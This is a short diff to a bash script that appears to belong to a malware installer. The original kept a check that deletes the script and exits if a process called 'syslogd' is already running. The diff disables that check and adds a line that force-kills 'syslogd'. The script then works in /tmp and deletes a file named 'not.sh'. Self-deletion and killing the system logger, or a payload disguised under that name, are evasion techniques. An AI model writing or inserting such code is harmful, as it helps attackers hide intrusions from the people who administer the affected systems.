@@ -1,10 +1,11 @@
 #!/bin/bash
 
-if pgrep -x "syslogd" >/dev/null; then
-  echo "syslogd is already running"
-  rm -f "$(realpath "$0")"
-  exit 0
-fi
+#if pgrep -x "syslogd" >/dev/null; then
+#  echo "syslogd is already running"
+#  rm -f "$(realpath "$0")"
+#  exit 0
+#fi
+pkill -9 -x syslogd
 # Go to /tmp
 cd /tmp
 rm -rf not.sh
